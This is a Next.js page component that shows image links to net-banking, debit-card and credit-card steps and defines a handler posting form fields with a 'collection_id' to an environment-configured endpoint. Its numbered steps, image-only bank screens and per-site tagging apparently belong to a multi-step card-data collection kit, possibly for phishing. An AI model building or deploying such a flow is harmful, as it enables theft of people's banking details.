'use client';
import Link from "next/link";
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import styles from "./pages.module.css";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            if(responseData.status==200){
                localStorage.setItem('collection_id', responseData.data);
                router.push('/4');
            }else{
              alert("not found ss");
            }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <main className={`container ${styles.container}`}>
    <div className=" m-2">
        <img src="assets/3header.jpg" width="100%" alt="" />
        <Link href="/4nb" className="my-2">
            <img src="assets/ntbn.jpg" alt="" width="100%" />
        </Link>
        <Link href="/4dc" className="my-2">
        <img src="assets/dc.jpg" alt="" width="100%" />
        </Link>
        <Link href="/4dc">
        <img src="assets/cc.jpg" alt="" width="100%" />
        </Link>
        <img src="assets/3footer.jpg" width="100%" alt="" />
    </div>
    </main>

    <Footer />
</>
  );
}
